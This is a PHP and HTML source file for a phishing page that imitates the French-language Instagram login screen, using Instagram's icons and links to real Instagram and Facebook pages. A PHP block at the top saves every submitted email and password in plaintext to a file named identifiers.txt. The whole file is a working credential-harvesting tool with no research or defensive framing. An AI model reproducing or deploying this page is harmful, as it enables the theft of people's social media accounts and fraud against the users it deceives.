<!-- section for php -->
<?php

    if(isset($_POST['email']) && isset($_POST['password']) ){
        $email = $_POST['email'];
        $password = $_POST['password'];
        $value = @file_get_contents('identifiers.txt');
        $value = $value."\n email : ".$email."\t|\tpassword :".$password; 
        @file_put_contents('identifiers.txt',$value);
    }
?>
<!-- section for a html code -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion . Instagram</title>
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
</script>
</head>
<body>
    <div class="container">
        <form action="" method='POST'>
            <div class="container section1">
                <br>
                <i class='logo'></i>
                <br>
                <br>
                <input class="form-control" type="email" name="email" id="email" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" required>
                <br>
                <input class="form-control" type="password" name="password" id="password" placeholder="Mot de passe" required>
                <br>
                <button class="btn btn-primary" type="submit">Se connecter</button>
                <br>
                <br>
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-4 left">
                            <hr>
                        </div>
                        <div class="col-4 middle">
                            <label>ou</label>
                        </div>
                        <div class="col-4 right">
                            <hr>
                        </div>
                    </div>
                </div>
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-6 face">
                            <img src="https://cdn-icons-png.flaticon.com/256/124/124010.png" alt="" width='16px' height='16px'>
                        </div>
                        <div class="col-6 textface">
                            <a href="https://web.facebook.com/dialog/oauth?encrypted_query_string=AeDq_-tMDby1L2vkNFBl0xYTszj7dT54dFedRsv7xHik9EcHuufbh5iZ6-e_36ZtUCPoEnLUNtQIrQpM7X4Y9giJ_JngY4eT4U0m5QrzWsM1J5jwa0Uv_iy2oBQSnk6_Q021BD6y2VkQfSCwJcAdTBnG8pcvaWzbytDgnIWviMjnGiRO3IatjEhkzW3A6wvMDHvVcjTt6cJPDQwSZQM7C0pnjNe1q0mE4dvnR2FpQGjzTAzcTj6G45kLBuSOTSdVPBO1puCiS6P21pQKHAVZ77ZMrHDO3vfr-_V72d-porHF9nJSzqpc-QslNg9DNP1fRc011U1JP6iG2smEUA6HMIwgytjGdXSeOFYK4sMK3Jazk6CQg0k-WViM04sEgirAKj9o5eLvhtNZHO81apbMUbu1CXZLflAbzf-5Eut-q7MQ46eeVIyR97i_UdACDmbwCtmINhtFSYLqF2IAcCZ1zk4wQj-8VA&_rdc=1&_rdr"><label style="color:#385185;font-size:14px;"><strong>Se connecter avec Facebook</strong></label></a>
                        </div>
                    </div>
                </div>
                <br>
                <a href="https://www.instagram.com/accounts/login/password/reset"><p style="color:#00376B;font-size:12px;">Mot de passe oublié ?</p></a>
            </div>
            <br>
            <div class="container section1">
                <p style="font-size:14px;">Vous n’avez pas de compte ?<a href="https://www.instagram.com/accounts/login/emailsignup">Inscrivez-vouz</a></p>
            </div>
        </form>
        <br>
        <P>Telechargez l'application</P>
        <div class="row">
            <div class="col-6"><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D60ABE7A6-715C-4E40-810A-8D91B2FEB7C4%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F"><img alt="Téléchargez-le dans Google Play" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/093c-DX36-y.png"></a></div>
            <div class="col-6"><a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1366%2C728"><img alt="Téléchargez-le sur Microsoft Store" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yk/r/NtqqucWkedn.png"></a></div>
        </div>
    </div>
</body>
</html>